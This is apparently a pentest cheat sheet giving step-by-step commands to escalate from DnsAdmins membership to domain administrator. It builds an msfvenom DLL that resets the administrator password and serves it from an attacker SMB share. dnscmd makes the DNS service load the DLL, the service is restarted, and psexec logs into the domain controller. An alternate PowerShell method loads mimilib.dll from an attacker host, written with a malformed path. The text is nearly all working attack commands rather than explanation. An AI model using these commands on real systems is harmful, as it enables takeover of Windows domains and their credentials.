### A user that is a member of the DnsAdmins group, has the ability to use dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service.

### We can create our own malicious .dll payload with msfvenom to escalate privileges

### Steps:

## Enumeration

 - Get-NetGroupMember -GroupName "DNSAdmins"

 - Get-ADGroupMember -Identity DNSAdmins

## Exploitation

#### 1) msfvenom -p windows/x64/exec cmd='net user administrator P@55w0rd123! /domain' -f dll > pwn.dll

#### 2) sudo smbserver.py share ./ (Host the file remotely)

#### 3) cmd /c dnscmd localhost /config /serverlevelplugindll \\OUR_IP\share\pwn.dll (Set the remote DLL path into the windows registry)

#### 4) sc.exe stop dns

#### 5) sc.exe start dns (Restart the DNS service to execute our malicious dll)

#### 6) sudo psexec.py DOMAIN.LOCAL/administrator@DC_IP

#### 7) PWN3D!

## Alternate Method: DNSServer module

 - $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All

 - $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"

 - Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose

### Check for successful previous command

 - Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
